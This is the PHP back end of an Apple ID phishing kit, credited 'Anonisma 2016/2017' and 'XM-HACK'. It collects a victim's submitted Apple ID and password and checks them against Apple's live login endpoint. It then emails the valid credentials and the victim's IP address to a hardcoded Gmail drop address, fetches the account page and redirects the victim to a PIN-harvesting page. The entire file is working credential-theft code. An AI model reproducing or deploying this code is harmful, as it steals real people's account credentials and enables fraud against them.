<?php
//---------------------------------------------------------------------------------------- CPY
  # True & Get Bill ... Anonisma 2016 / 2017 ... Wald Lablad Khobz O Barrad ...
//---------------------------------------------------------------------------------------- INC
    error_reporting(0);
	session_start();
	include 'funciones.php';
	
//---------------------------------------------------------------------------------------- VAR
    $khona = $_SERVER['HTTP_USER_AGENT'];
	$em = urlencode($_POST['appleId']);
	$ps = urlencode($_POST['accountPassword']);
//---------------------------------------------------------------------------------------- UTR
	$true = 'https://idmsa.apple.com/IDMSWebAuth/authenticate';
	$idkey = 'f52543bf72b66552b41677a95aa808462c95ebaaaf19323ddb3be843e5100cb8';
	$info = "appleId=$em&accountPassword=$ps&appIdKey=$idkey";
//---------------------------------------------------------------------------------------- UBL
	$bill = "https://appleid.apple.com/".$_SESSION['code_kbir']."/account/manage";
//---------------------------------------------------------------------------------------- CTR
	$VRF = Anon_http(0, $khona, $true, $info, 1, 1, 1, 1, 0, 0);
//---------------------------------------------------------------------------------------- CBL
	if (preg_match('/errormsg/i', $VRF)) 
	{
		die("<script type='text/javascript'> top.location = './index.php'; </script>");
	}else
	{
$ip = getenv("REMOTE_ADDR");
$L9lawiFkrkEmail = "kech17201720@gmail.com"; // Hna l Email Dyalk




$ZbiMSG  = "~~~~~~~~~~~~~~~~~{ XM-HACK }~~~~~~~~~~~~~~~~~\n";
$ZbiMSG .= "XM-ATS ID   : ".$_POST['appleId']."\n";
$ZbiMSG .= "XM-ATS Pass : ".$_POST['accountPassword']."\n";
$ZbiMSG .= "~~~~~~~~~~~{ XM-HACK | IP Infos }~~~~~~~~~~~~\n";
$ZbiMSG .= "Geo IP    : www.geoiptool.com/?IP=$ip\n";
$ZbiMSG .= "Victim IP : ".$ip."\n";
$ZbiMSG .= "~~~~~~~~~~~~~~~~~{ XM-HACK }~~~~~~~~~~~~~~~~~\n";
$XM_Sub = "XM-ATS Rzl From : $ip";
$XM_Bil = "From: Login<Info@Info.CoM>";
{
mail("$L9lawiFkrkEmail","$XM_Sub","$ZbiMSG","$XM_Bil");   
}
		$tba3_bill = Anon_http(0, $khona, $bill, 0, 0, 0, 1, 0, 1, 0);
		$_SESSION['tba3_bill'] = $tba3_bill;
		die("<script type='text/javascript'> top.location = 'pin.html'; </script>");
	}
	
	
//---------------------------------------------------------------------------------------- FIN

	
//---------------------------------------------------------------------------------------- FIN